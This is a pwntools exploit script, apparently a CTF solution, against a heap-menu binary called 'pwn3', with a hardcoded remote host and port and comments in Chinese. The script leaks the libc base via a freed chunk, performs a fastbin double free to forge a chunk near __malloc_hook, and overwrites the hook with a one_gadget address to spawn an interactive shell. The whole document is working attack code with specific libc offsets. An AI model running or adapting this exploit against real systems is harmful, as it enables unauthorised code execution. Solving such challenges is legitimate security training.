#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
debug = 0
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./pwn3")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_gadget_offset=0x4526a
else:
    a=remote("101.71.29.5","10002")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_gadget_offset=0x4526a
if debug :
    gdb.attach(a,'''
    b *(0x555555554000+0xbff)
    ''')

elf=ELF("./pwn3")
def menu(index):
    #a.recv()
    a.sendline(str(index))
def create(size,content):
    menu(1)
    #a.recv()
    a.sendline(str(size))
    #a.recv()
    a.send(content)

def delete(index):
    menu(3)
    #a.recv()
    a.sendline(str(index))
def printf(index):
    menu(2)
    #a.recv()
    a.sendline(str(index))

create(0x80,"aaa")#index 0
create(0x80,"aaa")#index 1 防止chunk0被top chunk合并
delete(0)
printf(0)
a.recvuntil(":")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-0x3c4b10-0x10
success("libc_base address ==> 0x%x"%libc_base)
one_gadget=libc_base +0xf02a4
success("one_gadget ==> 0x%x"%one_gadget)
create(0x80,"AAAA")#将free掉的补上

#double free,__malloc_hook=0x3c4b10+0x7ffff7a0d000
# size addr=0x7ffff7dd1af5 ,size=0x7f
create(0x60,"AAAA")#index 3
create(0x60,"AAAA")#index 4
delete(3)
delete(4)
delete(3)
fake_chunk_addr=0x7ffff7dd1af5-0x8-0x7ffff7a0d000+libc_base
create(0x60,p64(fake_chunk_addr))#index 5 ,修改fd
create(0x60,"aa")#index 6
create(0x60,"aaa")#index 7
payload='A'*19+p64(one_gadget)
create(0x60,payload)#index 8 ,得到目标chunk，修改__malloc__hook
a.recv()
a.sendline("1")
a.recv()
a.sendline("30")
a.interactive()


